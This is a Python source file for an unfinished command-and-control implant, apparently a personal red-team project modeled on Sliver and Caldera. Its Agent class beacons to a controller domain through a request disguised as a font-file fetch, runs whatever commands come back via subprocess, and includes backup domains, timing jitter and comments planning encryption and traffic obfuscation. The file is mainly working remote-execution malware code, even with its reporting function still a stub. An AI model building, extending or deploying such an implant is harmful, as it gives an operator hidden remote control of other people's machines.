# NOTE: This is a newer agent file to handle more advanced beacon and session communication
# At some point the agent_html.py will be reintegrated in some form here
import time
import random
from flask import request
import requests
import subprocess
from typing import List

# Honestly probably the smart thing would be to just copy from what they have in sliver, as those are likely mapped to go use cases
# For now though:

# .css - Key exchange (to be implemented once we add encryption)
# .png - close session messages
# .woff - Gets information on a beacon request
# .js - session messages


# TODO: Make it such that the agent sends using a protobuf, rather than a json, using json for now as honestly it is just easier. I ain't trying to be an attacker
class Agent:
    def __init__(
        self,
        domains: list[str],
        mode: str = "b",
        session=None,
        beacon_timer: int = 60,
        watchdog_timer: int = 7000,
    ):
        """Agent class:

        Args:
            domains - a list of domains that the agent can utilize for communication
                    the first domain is the primary domain, and all others afterwards are backups

            mode - sets the starting mode of the agent, either session or beacon based communication.
                set to beacon by default
        """

        self.domains = domains
        self.mode = mode
        self.stayAlive = True
        self.activeDomain = domains[0]
        self.session = None

        # NOTE: Other things that can be added here in the future
        # encoders - the type of encoders that are used/available
        # url params - different url paramters to obfuscate

        # Timers that dictate the agents communication and timeouts
        # Inspired by the timeouts that are used in MITRE Caldera

        self.beacon_inter = beacon_timer

        # How long the agent waits for an unreachable server before terminating itself
        # If there is a backup domain, the agent will switch to that domain
        self.watchdog_timer = watchdog_timer

    def execute_beacon_chain(self):
        """Executes the entire chain of beaconing including the execution and the sending back of commands
        Returns:
            - True if the chain of sending was sucessful
            - False if the chain of sending the command was not sucessful
        """

        # The agent checks in to see if commands are available
        commands = self._check_in()
        results = []
        if commands:
            results = self._execute_command(commands)
            return self._beacon_back(results)
        else:
            # Means that no commands were recieved (or there was a connection erorr and we sleep)
            return False

    def _beacon_back(self, results) -> bool:
        """Beacons back the output of any commands to the C2 server
        Returns:
            True - Results were successfully sent back
            False - Results were not sucessfully sent back"""
        pass

    def _check_in(self) -> List[str] | None:
        """Obtains any available commands if there are any, if no commands are available it fails"""

        # Generate a session
        self.session = requests.Session()

        # TODO: In the future, this request is going to require: encryption, nonce and obfuscation

        try:
            request = self.session.get(
                # TODO: In the futeu this should be a randomly generated URL and woff file
                f"http://{self.activeDomain}/jfiowe/jfioewfj/test.woff"
            )
            request.raise_for_status()

            # Otherwise we obtain the available commands
            response = request.json()
            return response["commands"]

        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return None

    def _execute_command(self, command_list):
        """
        Executes commands (passed in as a parameter of a list) in order to run
        """
        result = None
        try:
            """
            Returns a CompletedProcess object with the following attributes: 
            - .returncode
            - .stdout 
            - .stderr 
            - .args 
            """

            result = subprocess.run(
                command_list,
                capture_output=True,
                text=True,
                check=True,
            )
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"Command failed {e.stderr}")
        except Exception as e:
            print(f"Error: {e}")

    def get_beacon_range(self, range: int = 10):
        """Returns a range for the beacon as a tuple this is so it runs on a slight jitter
        Args:
            range - +- the interval set on initialization"""

        return (self.beacon_inter - range, self.beacon_inter + range)

    def is_alive(self):
        return self.stayAlive

    def kill(self):
        self.stayAlive = False

    def is_beacon(self):
        return self.mode == "b"

    def _set_beacon(self):
        self.mode = "b"
        return

    def _set_session(self):
        self.mode = "s"
        return


# agent = Agent(domains=["localhost2.com"])
# while agent.is_alive():
#     # Beacon mode
#     if agent.is_beacon():
#         outcome = agent.execute_beacon_chain()
#         # Set the agent to sleep for a period of time
#         print(outcome)
